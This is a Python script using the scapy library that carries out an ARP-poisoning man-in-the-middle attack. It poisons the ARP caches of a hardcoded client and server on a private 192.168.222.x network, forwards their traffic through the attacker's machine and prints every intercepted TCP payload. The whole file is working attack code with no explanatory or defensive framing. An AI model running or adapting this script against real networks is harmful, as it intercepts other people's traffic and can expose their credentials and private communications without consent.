#!/usr/bin/python3

from scapy.all import *
import threading
import time

client_ip = "192.168.222.186"
client_mac = "00:0c:29:98:cd:05"

server_ip = "192.168.222.185"
server_mac = "00:0c:29:26:32:aa"

my_ip = "192.168.222.187"
my_mac = "00:0c:29:e5:f1:21"

def packet_handle(packet):
    if packet.haslayer("ARP"):
        if packet.pdst == client_ip or packet.pdst == server_ip:
            if packet.op == 1: # request
                if packet.pdst == client_ip:
                    pkt = Ether(dst=client_mac,src=my_mac)/ARP(op=1,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)
                if packet.pdst == server_ip:
                    pkt = Ether(dst=server_mac,src=my_mac)/ARP(op=1,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)

                pkt = Ether(dst=packet.src)/ARP(op=2,pdst=packet.psrc,psrc=packet.pdst) #reply
                sendp(pkt)
            if packet.op == 2: #reply
                if packet.pdst == client_ip:
                    pkt = Ether(dst=client_mac,src=my_mac)/ARP(op=2,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)
                if packet.pdst == server_ip:
                    pkt = Ether(dst=server_mac,src=my_mac)/ARP(op=2,pdst=packet.pdst,psrc=packet.psrc)
                    sendp(pkt)
                

    if packet.haslayer("IP"):
        if packet[IP].dst == client_ip or packet[IP].dst == server_ip:
            if packet[IP].dst == client_ip:
                packet[Ether].dst=client_mac
            if packet[IP].dst == server_ip:
                packet[Ether].dst=server_mac
            packet[Ether].src = my_mac
            sendp(packet)
        if packet.haslayer("TCP"):
            print(packet[TCP].payload)
            
class SniffThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        sniff(prn = packet_handle,count=0)

class PoisoningThread(threading.Thread):
    __src_ip = ""
    __dst_ip = ""
    __mac = ""
    def __init__(self,dst_ip,src_ip,mac):
        threading.Thread.__init__(self)
        self.__src_ip = src_ip
        self.__dst_ip = dst_ip
        self.__mac = mac

    def run(self):
        pkt = Ether(dst=self.__mac)/ARP(pdst=self.__dst_ip,psrc=self.__src_ip)
        srp1(pkt)
        print("poisoning thread exit")

if __name__ == "__main__":
    my_sniff = SniffThread()
    client = PoisoningThread(client_ip,server_ip,client_mac)
    server = PoisoningThread(server_ip,client_ip,server_mac)

    client.start()
    server.start()
    my_sniff.start()

    client.join()
    server.join()
    my_sniff.join()
